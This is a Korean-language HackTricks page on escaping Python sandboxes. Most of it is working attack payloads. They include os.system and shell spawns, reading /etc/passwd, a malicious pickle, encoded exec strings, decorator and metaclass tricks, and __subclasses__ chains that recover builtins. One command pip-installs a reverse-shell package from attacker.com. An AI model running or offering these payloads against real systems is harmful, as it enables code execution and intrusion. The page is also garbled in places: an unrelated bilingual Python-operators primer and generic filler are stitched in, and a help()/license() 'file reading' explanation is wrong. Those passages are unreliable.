# Python 샌드박스 우회

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 적극적인 위협 스캔을 실행하여 API부터 웹 앱 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

이는 Python 샌드박스 보호를 우회하고 임의의 명령을 실행하는 몇 가지 트릭입니다.

## 명령 실행 라이브러리

알아야 할 첫 번째 사항은 이미 가져온 라이브러리로 코드를 직접 실행할 수 있는지 여부이거나 이러한 라이브러리 중 하나를 가져올 수 있는지입니다:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
_**open**_ 및 _**read**_ 함수는 파이썬 샌드박스 내에서 파일을 읽고 샌드박스를 우회하기 위해 실행할 수 있는 코드를 작성하는 데 유용할 수 있습니다.

{% hint style="danger" %}
**Python2 input()** 함수는 프로그램이 충돌하기 전에 파이썬 코드를 실행할 수 있게 합니다.
{% endhint %}

파이썬은 **현재 디렉토리에서 라이브러리를 먼저 로드**하려고 시도합니다 (다음 명령은 파이썬이 모듈을 로드하는 위치를 출력합니다): `python3 -c 'import sys; print(sys.path)'`

![](<../../../.gitbook/assets/image (552).png>)

## 기본 설치된 파이썬 패키지를 사용하여 pickle 샌드박스 우회

### 기본 패키지

여기에서 **미리 설치된 패키지 목록**을 찾을 수 있습니다: [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
pickle을 통해 시스템에 설치된 임의의 라이브러리를 가져올 수 있습니다.\
예를 들어, 다음 pickle은 로드될 때 pip 라이브러리를 가져와 사용합니다:
```python
#Note that here we are importing the pip library so the pickle is created correctly
#however, the victim doesn't even need to have the library installed to execute it
#the library is going to be loaded automatically

import pickle, os, base64, pip
class P(object):
def __reduce__(self):
return (pip.main,(["list"],))

print(base64.b64encode(pickle.dumps(P(), protocol=0)))
```
더 자세한 정보는 다음을 참조하세요: [https://checkoway.net/musings/pickle/](https://checkoway.net/musings/pickle/)

### Pip 패키지

**@isHaacK**가 공유한 트릭

`pip` 또는 `pip.main()`에 액세스할 수 있다면 임의의 패키지를 설치하고 역쉘이 호출될 수 있습니다.
```bash
pip install http://attacker.com/Rerverse.tar.gz
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
```
여기에서 역쉘이 생성되는 패키지를 다운로드할 수 있습니다. 사용하기 전에 **압축을 풀고, `setup.py`를 변경하고, 역쉘에 대한 IP를 입력**해야 합니다:

{% file src="../../../.gitbook/assets/reverse.tar.gz" %}

{% hint style="info" %}
이 패키지는 `Reverse`라고 불립니다. 그러나 역쉘을 종료하면 나머지 설치가 실패하도록 특별히 제작되었으므로, 서버에 **추가적인 파이썬 패키지가 설치되지 않습니다**.
{% endhint %}

## 파이썬 코드 평가하기

{% hint style="warning" %}
exec는 여러 줄 문자열과 ";"을 허용하지만, eval은 그렇지 않습니다 (walrus 연산자 확인)
{% endhint %}

특정 문자가 금지되어 있다면 **16진수/8진수/B64** 표현을 사용하여 제한을 **우회**할 수 있습니다:
```python
exec("print('RCE'); __import__('os').system('ls')") #Using ";"
exec("print('RCE')\n__import__('os').system('ls')") #Using "\n"
eval("__import__('os').system('ls')") #Eval doesn't allow ";"
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #This way eval accept ";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#One liners that allow new lines and tabs
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
```

```python
#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
```
### Python 코드를 평가할 수 있는 다른 라이브러리들

There are several other libraries that can be used to evaluate Python code. These libraries provide alternative methods to bypass Python sandboxes and execute arbitrary code. Some of these libraries include:

- **`execnet`**: This library allows the execution of code in separate Python interpreters, which can help bypass certain restrictions imposed by sandboxes.

- **`ast`**: The `ast` module provides a way to parse Python source code into an abstract syntax tree (AST). By manipulating the AST, it is possible to execute code in a sandboxed environment.

- **`byteplay`**: This library allows the manipulation of Python bytecode, which can be used to execute code in a sandboxed environment.

- **`pypyjs`**: This library is a Python interpreter written in JavaScript. It can be used to execute Python code in a sandboxed environment within a web browser.

- **`pyjion`**: This library is a just-in-time (JIT) compiler for Python. It can be used to compile Python code and execute it in a sandboxed environment.

- **`pycparser`**: This library provides a way to parse C code into an abstract syntax tree (AST). By manipulating the AST, it is possible to execute C code in a sandboxed environment.

These libraries can be useful for bypassing Python sandboxes and executing code in restricted environments. However, it is important to use them responsibly and ethically, and only with proper authorization.
```python
#Pandas
import pandas as pd
df = pd.read_csv("currency-rates.csv")
df.query('@__builtins__.__import__("os").system("ls")')
df.query("@pd.io.common.os.popen('ls').read()")
df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")

# The previous options work but others you might try give the error:
# Only named functions are supported
# Like:
df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
```
## 연산자와 간단한 트릭

### Operators

### 연산자

Python provides a variety of operators that can be used to perform different operations on variables and values. Here are some commonly used operators:

Python은 변수와 값에 대해 다양한 연산을 수행하는 데 사용할 수 있는 여러 연산자를 제공합니다. 다음은 일반적으로 사용되는 연산자 몇 가지입니다:

- Arithmetic Operators: `+`, `-`, `*`, `/`, `%`, `**`, `//`
- 산술 연산자: `+`, `-`, `*`, `/`, `%`, `**`, `//`

- Assignment Operators: `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`, `//=`
- 할당 연산자: `=`, `+=`, `-=`, `*=`, `/=`, `%=`, `**=`, `//=`

- Comparison Operators: `==`, `!=`, `>`, `<`, `>=`, `<=`
- 비교 연산자: `==`, `!=`, `>`, `<`, `>=`, `<=`

- Logical Operators: `and`, `or`, `not`
- 논리 연산자: `and`, `or`, `not`

- Bitwise Operators: `&`, `|`, `^`, `~`, `<<`, `>>`
- 비트 연산자: `&`, `|`, `^`, `~`, `<<`, `>>`

- Membership Operators: `in`, `not in`
- 멤버십 연산자: `in`, `not in`

- Identity Operators: `is`, `is not`
- 식별 연산자: `is`, `is not`

### Short Tricks

### 간단한 트릭

Here are some short tricks that can be used in Python programming:

다음은 Python 프로그래밍에서 사용할 수 있는 몇 가지 간단한 트릭입니다:

- Swapping Variables: You can swap the values of two variables using a single line of code.
- 변수 교환: 한 줄의 코드로 두 변수의 값을 교환할 수 있습니다.

```python
a, b = b, a
```

- Conditional Assignment: You can assign a value to a variable based on a condition using a single line of code.
- 조건부 할당: 한 줄의 코드로 조건에 따라 변수에 값을 할당할 수 있습니다.

```python
x = 10 if condition else 20
```

- Multiple Assignments: You can assign multiple values to multiple variables using a single line of code.
- 다중 할당: 한 줄의 코드로 여러 변수에 여러 값을 할당할 수 있습니다.

```python
a, b, c = 1, 2, 3
```

- Chaining Comparison Operators: You can chain multiple comparison operators together to create complex conditions.
- 비교 연산자 연결: 여러 비교 연산자를 연결하여 복잡한 조건을 만들 수 있습니다.

```python
if a < b < c:
    print("a is less than b and b is less than c")
```

- Using `enumerate()`: You can use the `enumerate()` function to get the index and value of each element in an iterable.
- `enumerate()` 사용: `enumerate()` 함수를 사용하여 반복 가능한 객체의 각 요소의 인덱스와 값을 가져올 수 있습니다.

```python
for index, value in enumerate(my_list):
    print(index, value)
```

- Using `zip()`: You can use the `zip()` function to iterate over multiple iterables simultaneously.
- `zip()` 사용: `zip()` 함수를 사용하여 여러 반복 가능한 객체를 동시에 반복할 수 있습니다.

```python
for x, y in zip(list1, list2):
    print(x, y)
```

These are just a few examples of the operators and short tricks that can be used in Python programming. Experiment with them and explore more possibilities!

이것들은 Python 프로그래밍에서 사용할 수 있는 연산자와 간단한 트릭의 몇 가지 예시에 불과합니다. 이들을 실험하고 더 많은 가능성을 탐색해보세요!
```python
# walrus operator allows generating variable inside a list
## everything will be executed in order
## From https://ur4ndom.dev/posts/2020-06-29-0ctf-quals-pyaucalc/
[a:=21,a*2]
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]
## This is very useful for code injected inside "eval" as it doesn't support multiple lines or ";"
```
## 보호 기능 우회하기: 인코딩 (UTF-7)을 통한 우회

[**이 문서**](https://blog.arkark.dev/2022/11/18/seccon-en/#misc-latexipy)에서는 UTF-7을 사용하여 표면적인 샌드박스 내에서 임의의 파이썬 코드를 로드하고 실행하는 방법이 소개됩니다:
```python
assert b"+AAo-".decode("utf_7") == "\n"

payload = """
# -*- coding: utf_7 -*-
def f(x):
return x
#+AAo-print(open("/flag.txt").read())
""".lstrip()
```
다른 인코딩을 사용하여 우회하는 것도 가능합니다. 예를 들어 `raw_unicode_escape`와 `unicode_escape`를 사용할 수 있습니다.

## 호출 없이 Python 실행하기

**호출을 허용하지 않는 Python 감옥**에 있다면, 여전히 임의의 함수, 코드 및 명령을 실행할 수 있는 몇 가지 방법이 있습니다.

### [데코레이터](https://docs.python.org/3/glossary.html#term-decorator)를 사용한 RCE
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
@exec
@input
class X:
pass

# The previous code is equivalent to:
class X:
pass
X = input(X)
X = exec(X)

# So just send your python code when prompted and it will be executed


# Another approach without calling input:
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
### RCE 객체 생성 및 오버로딩 우회

만약 **클래스를 선언**하고 그 클래스의 **객체를 생성**할 수 있다면, **직접 호출하지 않고도** **트리거**될 수 있는 **다른 메소드를 작성/덮어쓸** 수 있습니다.

#### 사용자 정의 클래스를 통한 RCE

기존의 클래스 메소드를 덮어쓰거나 새로운 클래스를 생성하여, **직접 호출하지 않고도** **트리거**될 때 **임의의 코드를 실행**할 수 있습니다.
```python
# This class has 3 different ways to trigger RCE without directly calling any function
class RCE:
def __init__(self):
self += "print('Hello from __init__ + __iadd__')"
__iadd__ = exec #Triggered when object is created
def __del__(self):
self -= "print('Hello from __del__ + __isub__')"
__isub__ = exec #Triggered when object is created
__getitem__ = exec #Trigerred with obj[<argument>]
__add__ = exec #Triggered with obj + <argument>

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
del rce

# These lines will get RCE when the program is over (exit)
sys.modules["pwnd"] = RCE()
exit()

# Other functions to overwrite
__sub__ (k - 'import os; os.system("sh")')
__mul__ (k * 'import os; os.system("sh")')
__floordiv__ (k // 'import os; os.system("sh")')
__truediv__ (k / 'import os; os.system("sh")')
__mod__ (k % 'import os; os.system("sh")')
__pow__ (k**'import os; os.system("sh")')
__lt__ (k < 'import os; os.system("sh")')
__le__ (k <= 'import os; os.system("sh")')
__eq__ (k == 'import os; os.system("sh")')
__ne__ (k != 'import os; os.system("sh")')
__ge__ (k >= 'import os; os.system("sh")')
__gt__ (k > 'import os; os.system("sh")')
__iadd__ (k += 'import os; os.system("sh")')
__isub__ (k -= 'import os; os.system("sh")')
__imul__ (k *= 'import os; os.system("sh")')
__ifloordiv__ (k //= 'import os; os.system("sh")')
__idiv__ (k /= 'import os; os.system("sh")')
__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= 'import os; os.system("sh")')
__ipow__ (k **= 'import os; os.system("sh")')
__ilshift__ (k<<= 'import os; os.system("sh")')
__irshift__ (k >>= 'import os; os.system("sh")')
__iand__ (k = 'import os; os.system("sh")')
__ior__ (k |= 'import os; os.system("sh")')
__ixor__ (k ^= 'import os; os.system("sh")')
```
#### [메타클래스](https://docs.python.org/3/reference/datamodel.html#metaclasses)를 사용하여 객체 생성하기

메타클래스를 사용하는 주요한 점은 생성자를 직접 호출하지 않고 대상 클래스를 메타클래스로 하는 새로운 클래스를 생성함으로써 클래스의 인스턴스를 만들 수 있다는 것입니다.
```python
# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
# This will define the members of the "subclass"
class Metaclass(type):
__getitem__ = exec # So Sub[string] will execute exec(string)
# Note: Metaclass.__class__ == type

class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
pass # Nothing special to do

Sub['import os; os.system("sh")']

## You can also use the tricks from the previous section to get RCE with this object
```
#### 예외를 트리거하여 객체 생성하기

**예외가 트리거되면** 예외의 **객체가 생성**되는데, 직접 생성자를 호출할 필요가 없습니다 ([**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)의 트릭).
```python
class RCE(Exception):
def __init__(self):
self += 'import os; os.system("sh")'
__iadd__ = exec #Triggered when object is created
raise RCE #Generate RCE object


# RCE with __add__ overloading and try/except + raise generated object
class Klecko(Exception):
__add__ = exec

try:
raise Klecko
except Klecko as k:
k + 'import os; os.system("sh")' #RCE abusing __add__

## You can also use the tricks from the previous section to get RCE with this object
```
### 더 많은 RCE

In this section, we will explore additional techniques for achieving Remote Code Execution (RCE) in Python sandboxes. These techniques can be used when the basic methods fail or when you need to bypass more advanced security measures.

#### 1. Exploiting Vulnerabilities in Python Libraries

Python libraries are not immune to vulnerabilities. By identifying and exploiting these vulnerabilities, you can potentially gain RCE in a Python sandbox. Some common vulnerabilities include:

- Deserialization vulnerabilities: These occur when untrusted data is deserialized without proper validation, leading to code execution. Look for libraries that use pickle, cPickle, or similar serialization methods.

- Command injection vulnerabilities: These occur when user input is not properly sanitized and is executed as a command. Look for libraries that execute shell commands or interact with the underlying operating system.

- Arbitrary code execution vulnerabilities: These occur when a library allows the execution of arbitrary code. Look for libraries that provide dynamic code execution capabilities.

To exploit these vulnerabilities, you need to identify the specific library and version used in the Python sandbox. Once you have this information, search for known vulnerabilities and corresponding exploits.

#### 2. Exploiting Python Interpreter Features

Python interpreters have various features that can be exploited to achieve RCE. Some common techniques include:

- Dynamic code execution: Python allows the execution of dynamically generated code using `eval()` or `exec()`. If the sandbox allows these functions, you can use them to execute arbitrary code.

- Module import vulnerabilities: Python imports modules dynamically at runtime. If the sandbox allows importing arbitrary modules, you can use this feature to execute code from a malicious module.

- Function and class manipulation: Python allows modifying functions and classes at runtime. If the sandbox allows this manipulation, you can modify existing functions or classes to execute arbitrary code.

To exploit these features, you need to understand the specific restrictions imposed by the Python sandbox and find ways to bypass them.

#### 3. Exploiting Python Sandbox Limitations

Python sandboxes often have limitations or restrictions in place to prevent code execution. By understanding these limitations, you can find ways to bypass them and achieve RCE. Some common limitations include:

- Restricted built-in functions: The sandbox may disable certain built-in functions that can be used for code execution, such as `open()`, `exec()`, or `eval()`. Look for alternative methods or workarounds to achieve the same functionality.

- Restricted modules: The sandbox may restrict access to certain modules that can be used for code execution, such as `os`, `subprocess`, or `sys`. Look for alternative modules or methods to achieve the desired functionality.

- Restricted file system access: The sandbox may limit access to the file system, preventing file read/write operations. Look for ways to bypass these restrictions, such as using alternative file access methods or exploiting file handling vulnerabilities.

To bypass these limitations, you need to carefully analyze the sandbox environment and experiment with different techniques to find vulnerabilities or weaknesses.

#### Conclusion

Achieving RCE in Python sandboxes requires a deep understanding of Python internals, vulnerabilities in Python libraries, and the specific limitations imposed by the sandbox. By combining different techniques and approaches, you can increase your chances of successfully bypassing Python sandboxes and gaining code execution capabilities. Remember to always follow ethical guidelines and obtain proper authorization before attempting any hacking activities.
```python
# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
# If sys is imported, you can sys.excepthook and trigger it by triggering an error
class X:
def __init__(self, a, b, c):
self += "os.system('sh')"
__iadd__ = exec
sys.excepthook = X
1/0 #Trigger it

# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
# The interpreter will try to import an apt-specific module to potentially
# report an error in ubuntu-provided modules.
# Therefore the __import__ functions are overwritten with our RCE
class X():
def __init__(self, a, b, c, d, e):
self += "print(open('flag').read())"
__iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```
### 내장 함수와 라이선스를 사용하여 파일 읽기

파이썬에서는 `help()` 함수와 `license()` 함수를 사용하여 파일을 읽을 수 있습니다.

#### `help()` 함수를 사용하여 파일 읽기

`help()` 함수는 파이썬 내장 함수로, 모듈, 함수, 클래스 등의 도움말을 제공합니다. 이 함수를 사용하여 파일을 읽을 수도 있습니다. 다음은 `help()` 함수를 사용하여 파일을 읽는 방법입니다.

```python
import builtins

filename = "파일 경로"
with open(filename, "r") as file:
    contents = file.read()
    builtins.help(contents)
```

위의 코드에서 `filename` 변수에 읽을 파일의 경로를 지정하고, `open()` 함수를 사용하여 파일을 엽니다. `with` 문을 사용하여 파일을 자동으로 닫아줍니다. 그리고 `file.read()` 함수를 사용하여 파일의 내용을 읽고, `builtins.help()` 함수를 사용하여 내용을 출력합니다.

#### `license()` 함수를 사용하여 파일 읽기

`license()` 함수는 파이썬 내장 함수로, 파이썬 인터프리터의 라이선스 정보를 제공합니다. 이 함수를 사용하여 파일을 읽을 수도 있습니다. 다음은 `license()` 함수를 사용하여 파일을 읽는 방법입니다.

```python
import builtins

filename = "파일 경로"
with open(filename, "r") as file:
    contents = file.read()
    builtins.license(contents)
```

위의 코드에서도 `filename` 변수에 읽을 파일의 경로를 지정하고, `open()` 함수를 사용하여 파일을 엽니다. `with` 문을 사용하여 파일을 자동으로 닫아줍니다. 그리고 `file.read()` 함수를 사용하여 파일의 내용을 읽고, `builtins.license()` 함수를 사용하여 내용을 출력합니다.
```python
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
pass
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

가장 중요한 취약점을 찾아서 빠르게 수정할 수 있습니다. Intruder는 공격 대상을 추적하고 예방적인 위협 스캔을 실행하여 API부터 웹 애플리케이션 및 클라우드 시스템까지 전체 기술 스택에서 문제를 찾습니다. [**무료로 시도해보세요**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 오늘.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 내장 함수

* [**Python2의 내장 함수**](https://docs.python.org/2/library/functions.html)
* [**Python3의 내장 함수**](https://docs.python.org/3/library/functions.html)

**`__builtins__`** 객체에 액세스할 수 있다면 라이브러리를 가져올 수 있습니다 (마지막 섹션에서 표시된 다른 문자열 표현을 여기에서도 사용할 수 있음에 유의하세요):
```python
__builtins__.__import__("os").system("ls")
__builtins__.__dict__['__import__']("os").system("ls")
```
### 내장 함수 없음

`__builtins__`가 없으면 **모든 전역 함수**(`open`, `import`, `print` 등)가 **로드되지 않으므로** 아무것도 가져오거나 파일을 읽거나 쓸 수 없습니다.\
그러나 **기본적으로 파이썬은 많은 모듈을 메모리에 임포트**합니다. 이러한 모듈은 무해해 보일 수 있지만, 그 중 일부는 내부에 **위험한 기능을 임포트**하는 것도 있으며, 이를 통해 **임의의 코드 실행**이 가능합니다.

다음 예제에서는 이러한 "**무해한**" 모듈을 **남용**하여 그 안에 있는 **위험한 기능**에 **접근**하는 방법을 살펴볼 수 있습니다.

**Python2**
```python
#Try to reload __builtins__
reload(__builtins__)
import __builtin__

# Read recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
# Write recovering <type 'file'> in offset 40
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')

# Execute recovering __import__ (class 59s is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59]()._module.__builtins__['__import__']('os').system('ls')
# Execute (another method)
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__("func_globals")['linecache'].__dict__['os'].__dict__['system']('ls')
# Execute recovering eval symbol (class 59 is <class 'warnings.catch_warnings'>)
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

# Or you could obtain the builtins from a defined function
get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
```
#### 파이썬3

Python is a powerful and versatile programming language that is widely used in various fields. However, its flexibility can also pose security risks, especially when running untrusted code. To mitigate these risks, Python sandboxes are often used to restrict the execution environment and prevent potentially malicious actions.

파이썬은 다양한 분야에서 널리 사용되는 강력하고 다용도로 사용되는 프로그래밍 언어입니다. 그러나 그 유연성은 신뢰할 수 없는 코드를 실행할 때 보안 위험을 야기할 수도 있습니다. 이러한 위험을 완화하기 위해 파이썬 샌드박스가 종종 사용되어 실행 환경을 제한하고 잠재적으로 악의적인 동작을 방지합니다.

In this guide, we will explore various techniques to bypass Python sandboxes and execute arbitrary code. These techniques can be useful for penetration testers and security researchers to assess the effectiveness of Python sandboxes and identify potential vulnerabilities.

이 가이드에서는 파이썬 샌드박스를 우회하고 임의의 코드를 실행하기 위한 다양한 기법을 탐색합니다. 이러한 기법은 펜테스터와 보안 연구원에게 파이썬 샌드박스의 효과를 평가하고 잠재적인 취약점을 식별하는 데 유용할 수 있습니다.

Please note that bypassing Python sandboxes without proper authorization is illegal and unethical. This guide is intended for educational purposes only and should not be used for any malicious activities.

적절한 권한 없이 파이썬 샌드박스를 우회하는 것은 불법적이고 윤리적으로 부적절합니다. 이 가이드는 교육 목적으로만 사용되어야 하며 악의적인 활동에는 사용되지 않아야 합니다.

**Disclaimer: The techniques described in this guide may not work against all Python sandboxes and may be subject to change as new security measures are implemented. Always ensure that you have proper authorization and legal permission before attempting any bypass techniques.**

**면책 조항: 이 가이드에서 설명하는 기법은 모든 파이썬 샌드박스에 대해 동작하지 않을 수 있으며, 새로운 보안 조치가 구현됨에 따라 변경될 수 있습니다. 우회 기법을 시도하기 전에 항상 적절한 권한과 법적 허가를 확보하십시오.**
```python
# Obtain builtins from a globally defined function
# https://docs.python.org/3/library/functions.html
help.__call__.__builtins__ # or __globals__
license.__call__.__builtins__ # or __globals__
credits.__call__.__builtins__ # or __globals__
print.__self__
dir.__self__
globals.__self__
len.__self__
__build_class__.__self__

# Obtain the builtins from a defined function
get_flag.__globals__['__builtins__']

# Get builtins from loaded classes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
```
[**아래에는 더 큰 함수**](./#재귀적-내장-전역-검색)가 있습니다. 이 함수를 사용하여 **내장 함수**를 찾을 수 있는 수십/**수백 개의 위치**를 찾을 수 있습니다.

#### Python2와 Python3
```python
# Recover __builtins__ and make everything easier
__builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
__builtins__["__import__"]('os').system('ls')
```
### 내장 페이로드

Here are some examples of payloads that can be used to bypass Python sandboxes by exploiting built-in functions:

#### `__import__`

The `__import__` function can be used to import modules dynamically. By using this function, you can bypass restrictions on importing certain modules.

```python
__import__('os').system('ls')
```

#### `eval`

The `eval` function can be used to evaluate arbitrary Python expressions. This can be used to execute arbitrary code and bypass sandbox restrictions.

```python
eval("__import__('os').system('ls')")
```

#### `exec`

The `exec` function can be used to execute arbitrary Python code. This can be used to bypass sandbox restrictions and execute malicious code.

```python
exec("__import__('os').system('ls')")
```

#### `compile`

The `compile` function can be used to compile Python code into a code object. By using this function, you can bypass sandbox restrictions and execute arbitrary code.

```python
code = compile("__import__('os').system('ls')", "<string>", "exec")
exec(code)
```

#### `setattr`

The `setattr` function can be used to set attributes of an object dynamically. By using this function, you can bypass sandbox restrictions and execute arbitrary code.

```python
setattr(__builtins__, 'myfunc', lambda: __import__('os').system('ls'))
myfunc()
```

#### `type`

The `type` function can be used to create new types dynamically. By using this function, you can bypass sandbox restrictions and execute arbitrary code.

```python
MyClass = type('MyClass', (), {'myfunc': lambda self: __import__('os').system('ls')})
obj = MyClass()
obj.myfunc()
```

These are just a few examples of payloads that can be used to bypass Python sandboxes. It's important to note that the effectiveness of these payloads may vary depending on the specific sandbox implementation.
```python
# Possible payloads once you have found the builtins
__builtins__["open"]("/etc/passwd").read()
__builtins__["__import__"]("os").system("ls")
# There are lots of other payloads that can be abused to execute commands
# See them below
```
## 전역 변수와 지역 변수

**`globals`**와 **`locals`**를 확인하는 것은 접근할 수 있는 내용을 알기 위한 좋은 방법입니다.
```python
>>> globals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}
>>> locals()
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <class '_frozen_importlib.BuiltinImporter'>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, 'attr': <module 'attr' from '/usr/local/lib/python3.9/site-packages/attr.py'>, 'a': <class 'importlib.abc.Finder'>, 'b': <class 'importlib.abc.MetaPathFinder'>, 'c': <class 'str'>, '__warningregistry__': {'version': 0, ('MetaPathFinder.find_module() is deprecated since Python 3.4 in favor of MetaPathFinder.find_spec() (available since 3.4)', <class 'DeprecationWarning'>, 1): True}, 'z': <class 'str'>}

# Obtain globals from a defined function
get_flag.__globals__

# Obtain globals from an object of a class
class_obj.__init__.__globals__

# Obtaining globals directly from loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x) ]
[<class 'function'>]

# Obtaining globals from __init__ of loaded classes
[ x for x in ''.__class__.__base__.__subclasses__() if "__globals__" in dir(x.__init__) ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 